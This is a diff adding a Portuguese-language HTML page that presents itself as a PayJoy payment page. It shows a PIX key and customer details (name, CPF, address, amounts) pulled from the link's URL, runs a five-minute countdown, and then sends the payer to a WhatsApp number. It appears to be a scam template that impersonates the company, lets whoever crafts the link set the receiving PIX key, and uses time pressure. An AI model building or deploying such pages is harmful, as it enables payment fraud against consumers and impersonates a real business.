@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="images.png">
+<title>Página diária de pagamento da Payjoy</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f2f2f2;
+}
+
+header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 20px;
+    background: #ffffff;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+}
+
+header img {
+    height: 40px;
+}
+
+.container {
+    max-width: 520px;
+    margin: 20px auto;
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 25px;
+}
+
+h1 {
+    margin: 0;
+    font-size: 26px;
+    text-align: center;
+}
+
+.sub {
+    text-align: center;
+    color: #666;
+    margin: 10px 0 20px;
+}
+
+.instrucoes {
+    background: #f7f7f7;
+    padding: 15px;
+    border-radius: 10px;
+    font-size: 15px;
+}
+
+.pix-box {
+    border: 2px dashed #c2185b;
+    padding: 15px;
+    border-radius: 10px;
+    margin: 20px 0;
+    word-break: break-all;
+    font-size: 14px;
+    text-align: center;
+}
+
+button {
+    width: 100%;
+    padding: 14px;
+    background: #c2185b;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+.timer {
+    margin-top: 15px;
+    text-align: center;
+    font-weight: bold;
+    color: #c2185b;
+}
+
+/* BOTÃO RASTREIO */
+.rastreio {
+    display: none;
+    margin-top: 15px;
+    text-align: center;
+}
+
+/* EXTRATO ESTILO DA IMAGEM */
+.extrato {
+    margin-top: 25px;
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 18px;
+    box-shadow: 0 1px 6px rgba(0,0,0,0.08);
+    font-size: 14px;
+}
+
+.extrato h3 {
+    margin-top: 0;
+    margin-bottom: 12px;
+    font-size: 18px;
+}
+
+.linha {
+    display: flex;
+    justify-content: space-between;
+    margin: 6px 0;
+}
+
+.divisor {
+    border-top: 1px solid #ddd;
+    margin: 12px 0;
+}
+
+.total {
+    font-weight: bold;
+    font-size: 15px;
+}
+
+.obs {
+    margin-top: 10px;
+    font-size: 13px;
+    color: #444;
+}
+
+.rodape {
+    margin-top: 10px;
+    font-size: 12px;
+    color: #666;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <img src="py.webp" alt="Logo">
+    <img src="px.webp" alt="Pix">
+</header>
+
+<div class="container">
+
+    <h1 id="titulo"></h1>
+    <div class="sub">Pagamento de entrada Pay Joy</div>
+
+    <div class="instrucoes">
+        <p>1. Copie a chave PIX abaixo.</p>
+        <p>2. Acesse o aplicativo do seu banco.</p>
+        <p>3. Vá em PIX → Copia e Cola e finalize o pagamento.</p>
+    </div>
+
+    <div class="pix-box" id="pix"></div>
+
+    <button onclick="copiarPix()">Copiar chave PIX</button>
+
+    <div class="rastreio" id="rastreio">
+        <h3>Peça seu código de rastreio do pedido</h3>
+        <p>Após efetuar o pagamento clique abaixo</p>
+        <button onclick="irWhatsApp()">Solicitar rastreio</button>
+    </div>
+
+    <div class="timer" id="timer">Tempo restante: 05:00</div>
+
+    <!-- EXTRATO -->
+    <div class="extrato">
+        <h3>Resumo da Transação</h3>
+
+        <div class="linha"><span>Nome:</span><span id="cliente"></span></div>
+        <div class="linha"><span>CPF:</span><span id="cpf"></span></div>
+        <div class="linha"><span>Telefone:</span><span id="telefone"></span></div>
+        <div class="linha"><span>E-mail:</span><span id="email"></span></div>
+
+        <div class="divisor"></div>
+
+        <div class="linha"><span>Produto:</span><span id="produto"></span></div>
+        <div class="linha"><span>Taxa:</span><span>R$ 0,00</span></div>
+
+        <div class="linha total">
+            <span>Valor total</span>
+            <span>R$ <span id="valor_total"></span></span>
+        </div>
+
+        <div class="divisor"></div>
+
+        <div class="linha"><span>Entrada (PIX):</span><span>R$ <span id="entrada"></span></span></div>
+        <div class="linha"><span>Parcelas:</span><span id="parcelas"></span></div>
+        <div class="linha"><span>Método:</span><span id="metodo"></span></div>
+
+        <div class="divisor"></div>
+
+        <div class="linha"><span>Endereço:</span><span id="endereco"></span></div>
+
+        <div class="obs">
+            <strong>Observação:</strong> O pagamento é efetuado somente uma vez, sem cobranças mensais ou renovações automáticas.
+        </div>
+
+        <div class="rodape">
+            CNPJ: 41.868.609/0001-64<br>
+            PAYJOY DO BRASIL LTDA
+        </div>
+    </div>
+
+</div>
+
+<script>
+const p = new URLSearchParams(location.search);
+const campos = [
+    "titulo","pix","cliente","cpf","telefone","email",
+    "produto","valor_total","entrada","parcelas","metodo","endereco"
+];
+campos.forEach(c => {
+    const el = document.getElementById(c);
+    if (el) el.textContent = p.get(c) || "-";
+});
+
+function copiarPix() {
+    navigator.clipboard.writeText(document.getElementById("pix").textContent);
+    document.getElementById("rastreio").style.display = "block";
+    alert("Chave PIX copiada com sucesso!");
+}
+
+function irWhatsApp() {
+    const msg = encodeURIComponent(
+        "/gps envie essa mensagem e aguarde a análise do sistema em breve você receberá seu código de rastreio"
+    );
+    window.location.href = "https://wa.me/558597243058?text=" + msg;
+}
+
+/* TEMPORIZADOR */
+let tempo = 300;
+setInterval(() => {
+    if (tempo <= 0) {
+        document.getElementById("timer").textContent = "Tempo expirado";
+        return;
+    }
+    tempo--;
+    const m = String(Math.floor(tempo / 60)).padStart(2, "0");
+    const s = String(tempo % 60).padStart(2, "0");
+    document.getElementById("timer").textContent = `Tempo restante: ${m}:${s}`;
+}, 1000);
+</script>
+
+</body>
+</html>
